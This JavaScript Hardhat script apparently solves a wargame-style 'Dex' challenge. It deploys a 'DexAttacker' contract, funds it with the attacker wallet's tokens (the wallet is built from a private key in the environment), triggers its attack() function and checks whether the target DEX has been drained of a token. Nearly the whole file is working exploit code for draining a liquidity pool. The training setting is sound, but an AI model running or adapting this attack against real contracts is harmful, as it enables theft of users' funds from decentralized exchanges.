const { expect } = require("chai")
const { Wallet } = require("ethers")
const { ethers } = require("hardhat")
const { symbols, resetNode } = require("../helper-hardhat-config")
require("dotenv").config()

async function main() {
    await resetNode()
    let token1, token2, token1bal, token2bal, tx, res
    let attacker = new Wallet(process.env.METAMASK_PRIVATE_KEY, ethers.provider)
    let instanceAddress = "0xb9efc9e37e42433D5561c2b587e27E3A602e2CF5"
    let target = await ethers.getContractAt("Dex", instanceAddress, attacker)
    let attackerContractFactory = await ethers.getContractFactory("DexAttacker")
    let attackerContract = await attackerContractFactory.deploy(instanceAddress)

    console.log(`Attacker Address: ${attacker.address}`)
    console.log(`Found target contract at address: ${target.address}`)
    console.log(`Attacker Contract deployed at ${attackerContract.address}`)

    token1 = await target.token1()
    token2 = await target.token2()

    const getbal = async (targetAdd, printBool) => {
        token1bal = parseInt(await target.balanceOf(token1, targetAdd))
        token2bal = parseInt(await target.balanceOf(token2, targetAdd))
        if (printBool) {
            console.log(`Balance of ${targetAdd}:`)
            console.log(`Token 1: ${token1bal}`)
            console.log(`Token 2: ${token2bal}`)
        }
    }

    // Attack
    await getbal(attacker.address, true)
    let token1Contract = await ethers.getContractAt(
        "SwappableToken",
        token1,
        attacker
    )
    let token2Contract = await ethers.getContractAt(
        "SwappableToken",
        token2,
        attacker
    )
    tx = await token1Contract.transfer(attackerContract.address, token1bal)
    tx = await token2Contract.transfer(attackerContract.address, token2bal)
    await tx.wait(1)

    tx = await attackerContract.attack()
    await tx.wait(1)
    await getbal(attackerContract.address, true)

    // Check
    await getbal(target.address, true)
    if (token1bal == 0 || token2bal == 0) {
        console.log(`${symbols.success} Drained a token!`)
    } else {
        console.log(`${symbols.error} Both tokens still present!`)
    }
}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main()
    .then(() => process.exit(0))
    .catch((error) => {
        console.log(error)
        process.exit(1)
    })

module.exports = { main: main }
